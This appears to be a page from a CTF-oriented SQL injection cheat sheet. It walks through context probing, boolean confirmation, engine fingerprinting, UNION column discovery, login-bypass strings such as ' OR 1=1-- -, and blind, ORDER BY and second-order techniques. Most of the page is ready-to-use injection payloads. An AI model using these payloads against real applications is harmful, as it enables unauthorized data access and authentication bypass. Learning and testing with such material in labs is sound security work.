---
title: "01 · SQLi — Start Here"
weight: 10
bookToc: true
---

# SQL Injection — Start Here

**Order:** establish context → confirm true/false → identify engine → choose UNION or blind → enumerate schema → read the target row.

## 1. What does your input sit inside?

| Possible original query | Try as the input | Why |
| --- | --- | --- |
| `WHERE id = INPUT` | `1 AND 1=1` / `1 AND 1=2` | Numeric expression needs no quote |
| `WHERE name = 'INPUT'` | `apple' AND '1'='1` / `apple' AND '1'='2` | Preserve the original closing quote |
| `WHERE name = 'INPUT'` | `apple' AND 1=1-- -` / `apple' AND 1=2-- -` | Comment out the remaining query |
| `WHERE name LIKE '%INPUT%'` | `apple%' AND 1=1-- -` / `apple%' AND 1=2-- -` | Close the wildcard string |
| `WHERE (name = 'INPUT')` | `apple') AND 1=1-- -` / `apple') AND 1=2-- -` | Close the parenthesis too |
| `ORDER BY INPUT` | `1`, `2`, `999` | Identifier/expression position, not a quoted value |

Choose `apple` / `1` to match an existing row. An `AND` test on a nonexistent row is false for both probes. If the query has extra predicates or nested parentheses, reconstruct that shape before copying a UNION payload.

Small quote probes:

```text
'
''
"
1'
1')
1'))
```

One error is inconclusive. A quote error followed by a syntax repair is useful evidence, but escaping/validation can also create differences. Confirm with a boolean pair.

## 2. Confirm injection

### Numeric value

```sql
1 AND 7=7
1 AND 7=8
```

### Single-quoted string

```sql
apple' AND 7=7-- -
apple' AND 7=8-- -
```

### Authentication query, if the challenge gate is a vulnerable login

```sql
admin'-- -
' OR 1=1-- -
' OR 'a'='a'-- -
') OR ('a'='a')-- -
```

These bypass only certain query shapes. They do not bypass password verification performed separately after fetching a user, and an `OR` may select an arbitrary user. Confirm the actual account/role after login.

### Comment syntax

| Engine | Comments | Caveat |
| --- | --- | --- |
| MySQL / MariaDB | `-- `, `#`, `/* ... */` | `--` needs following whitespace/control; use `-- -` |
| PostgreSQL | `--`, `/* ... */` | No MySQL `#` comment |
| SQLite | `--`, `/* ... */` | A driver can restrict statement count |
| SQL Server | `--`, `/* ... */` | Types matter in UNION |
| Oracle | `--`, `/* ... */` | Traditional UNION probes use `FROM dual` |

## 3. Identify the database

Use **errors + a matching function + stack/source evidence**. A function failure can be caused by the wrong SQL context; never decide from one generic `500`.

| Error clue | Likely engine | Expression to retrieve in a working output slot |
| --- | --- | --- |
| `You have an error in your SQL syntax`, `MariaDB`, `mysqli` | MySQL / MariaDB | `VERSION()` and `DATABASE()` |
| `PostgreSQL`, `pg_query`, `unterminated quoted string`, `SQLSTATE 42601` | PostgreSQL | `version()` and `current_database()` |
| `SQLite`, `sqlite3`, `no such table`, `near ... syntax error` | SQLite; generic fragments need corroboration | `sqlite_version()` |
| `Unclosed quotation mark`, `SQL Server`, `ODBC Driver ... SQL Server` | SQL Server | `@@VERSION` and `DB_NAME()` |
| `ORA-01756`, `ORA-00933`, `ORA-00942` | Oracle | `banner FROM v$version`, or `USER FROM dual` |

Blind corroboration examples after finding the right quoting:

```sql
1 AND sqlite_version() IS NOT NULL
1 AND current_database() IS NOT NULL
1 AND DB_NAME() IS NOT NULL
1 AND DATABASE() IS NOT NULL
```

`version()` works on both MySQL and PostgreSQL. `@@version` works on MySQL and SQL Server. A successful shared function is not a unique fingerprint. Read the returned text or pair with engine-specific behavior.

## 4. Does the query return rows into the response?

### Count selected columns

```sql
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -
1' ORDER BY 4-- -
```

If 3 works and 4 fails with a position error, try three columns. A hidden error or an unrelated type error makes this inconclusive.

```sql
no_such_value' UNION SELECT NULL-- -
no_such_value' UNION SELECT NULL,NULL-- -
no_such_value' UNION SELECT NULL,NULL,NULL-- -
```

Oracle adaptation: `UNION SELECT NULL,NULL,NULL FROM dual`. Use a false original condition/value so original rows do not hide the injected row.

### Find a displayed text-compatible column

```sql
no_such_value' UNION SELECT 'CTFMARK',NULL,NULL-- -
no_such_value' UNION SELECT NULL,'CTFMARK',NULL-- -
no_such_value' UNION SELECT NULL,NULL,'CTFMARK'-- -
```

Change one position at a time. An integer column may reject a string on PostgreSQL, SQL Server, or Oracle. `NULL` is often a better starting placeholder than integers. The app may render only the first row or a particular field.

### Put the engine expression in that position

```sql
no_such_value' UNION SELECT NULL,sqlite_version(),NULL-- -
```

Now follow the matching page:

**[MySQL](../sqli-mysql/) · [PostgreSQL](../sqli-postgresql/) · [SQLite](../sqli-sqlite/) · [SQL Server](../sqli-mssql/) · [Oracle](../sqli-oracle/)**

## 5. No visible output?

| Signal | Next action |
| --- | --- |
| Rows / JSON fields displayed | UNION read |
| A stable true/false page difference | Boolean extraction |
| Detailed DB error body | Error-based extraction if supported |
| Only repeatable conditional delay | Time-based extraction |
| Immediate request looks safe, later export fails | Second-order injection |

Continue with [blind / error SQLi](../sqli-blind/). Stacked queries depend on both the database and the application driver. A database supporting semicolons does not mean the application accepts multiple statements.

## 6. Nonstandard insertion points

### ORDER BY

If source shows an unquoted sort expression and you can observe the first row:

```sql
CASE WHEN (1=1) THEN name ELSE id END
CASE WHEN (1=2) THEN name ELSE id END
```

This depends on compatible types; use two same-type columns or engine-appropriate casts. An allowlisted column name prevents this. A trailing UNION usually does not fit this position.

### LIKE wildcard behavior

`%` matches multiple characters and `_` matches one in SQL LIKE patterns. Broadening search using `%` alone can be normal intended wildcard behavior; it does not establish SQL syntax injection.

### Second order

Store a unique quote-bearing marker in a profile/product/name, then exercise reports, exports, searches, admin pages, and jobs that reuse it. Record the downstream request that actually executes the query. An escaped INSERT does not protect a later string-built SELECT.

## If the payload fails

| Symptom | Check next |
| --- | --- |
| `near UNION` / unexpected `)` | String/parenthesis closure |
| Column-count error | UNION column count |
| Type conversion error | Text-compatible slot / explicit cast |
| No injected row | Original result ordering, renderer, negative base value |
| Comment appears ineffective | MySQL trailing space, stripped whitespace, newline, URL encoding |
| Same page for true/false | Wrong parameter, missing session, no baseline row, cached response |
| Blocked keywords | [Encoding / filter transformations](../encoding-filters/) |

Reference: [PortSwigger SQLi syntax comparison](https://portswigger.net/web-security/sql-injection/cheat-sheet). Use it to cross-check syntax; the sequence here is a manual decision workflow.
